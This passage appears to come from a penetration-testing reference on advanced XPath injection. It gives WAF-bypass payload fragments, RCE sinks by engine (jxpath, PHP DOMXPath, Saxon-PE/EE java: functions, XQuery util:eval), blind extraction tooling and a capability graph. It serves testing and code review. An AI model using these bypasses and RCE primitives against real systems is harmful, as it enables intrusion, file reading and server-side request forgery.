- **A WAF that blocks `' or '1'='1'` but allows `'/or/'1'='1'`.** The second may be a WAF-only bypass with no backend evaluation — confirm with a non-WAF-string payload that still triggers the predicate break (e.g., `)]`).

## Advanced Pro Tips

- **jxpath is a direct-RCE sink unless the FunctionLibrary is blanked.** Grep Java repos for `JXPathContext` imports — the finding is "jxpath present without blank FunctionLibrary," independent of input validation.
- **PHP `DOMXPath::registerPhpFunctions()` without an allowlist is the PHP side of jxpath.** Grep PHP for `registerPhpFunctions()` calls — the finding is the API being called at all.
- **Saxon-HE is bounded; Saxon-PE/EE with `ALLOW_EXTERNAL_FUNCTIONS=true` is unbounded.** The runtime library name alone narrows the primitive set.
- **XPath 3.0 `fn:function-lookup` reaches engine-registered functions by QName.** A WAF that blocks `java:` namespace prefixes doesn't block `function-lookup(QName('http://xmlns.jboss.org/jbosscore', 'exec'), ...)` if the engine has such a function registered.
- **Second-order XPath lives in config fields.** Workflow config, saved search, user-defined filter — these are the storage sinks for stored XPath injection.
- **XQuery-backed engines accept full XQuery.** A sink labeled "XPath" may actually be XQuery; the superset enables `try{}catch`, variable binding, module imports, and EXPath file/HTTP modules.

## Advanced Tooling

- **xcat / xpath-injector** — automated blind extraction with binary-search optimization and OAST support.
- **Burp Suite + Collaborator** — manual payload crafting with Collaborator for `doc()` OAST.
- **Saxon-HE / Xalan CLI** — reproduce payloads locally against the pinned processor version to verify behavior before firing against the target.
- **lxml / jaxen / libxml2 Python bindings** — scripted reproduction for engine-specific behaviors.
- **BaseX / eXist-db shell** — local sandbox for XQuery superset testing when the target engine is BaseX- or eXist-shaped.
- **xmlstarlet** — command-line XPath for crafting payloads and verifying XML document shapes.

## Deep Second-Order Attack-Graph Model

Nodes = (engine : version : reach-flags). Edges = capability transfers:
- `libxml2 XPath 1.0` → `in-document primitives only` (no external edge)
- `Saxon-HE 2.0+ default` → `doc()` + `unparsed-text()` (external URI edges) + no Java reflection (bounded)
- `Saxon-PE/EE + ALLOW_EXTERNAL_FUNCTIONS` → `+ java:*` (direct RCE edge)
- `jxpath` → `java.lang.*` (direct RCE edge independent of input validation; FunctionLibrary-blanking is the only mitigation)
- `DOMXPath + registerPhpFunctions()` → `+ php:function` (direct RCE edge)
- `XQuery engine (BaseX/eXist)` → `+ util:eval`, `+ file:read-string`, `+ http:send-request` (direct RCE + file + SSRF)

The graph compresses "XPath injection on engine X" to the specific primitive set exposed. The novel sibling owns the CVE instances; this file owns the structural model.

The XPath class has a bounded primitive set — predicate break, per-engine function abuse, XQuery superset, SAML signature-reference redirection, and blind extraction — each now at full depth; the under-band line count is a finding (fewer primitive classes than SSRF/HTTP-smuggling), not a stop-short.

## Summary

The XPath advanced tier is the full established technique surface at depth: per-library parsing differentials (libxml2/Saxon-HE/PE/EE/JAXP/jxpath/Jaxen/.NET/lxml/DOMXPath/BaseX/eXist) each with distinct function support, external-URI policy, and hardening defaults; XPath 2.0/3.0 function abuse across the full `fn:*` surface (doc, document, unparsed-text, environment-variable, system-property, function-lookup, higher-order); XQuery superset (try/catch, module imports, EXPath file/http modules); SAML signature-reference XPath as a specific primitive class; blind extraction at depth with binary-search optimization and OAST promotion; error-based extraction via engines that echo evaluated subexpressions; and WAF/filter bypass as a technique class via metacharacter encoding, keyword avoidance, XQuery comment smuggling, and function-lookup reflection. Each CVE in `xpath_injection_novel_deep.md` reduces to one of these primitives: predicate break (OPNsense-class auth bypass), external resource load (SSRF/file read), engine-level reflection (jxpath/DOMXPath), signature-reference redirection (SAML), or stored XPath (workflow/filter DSL).
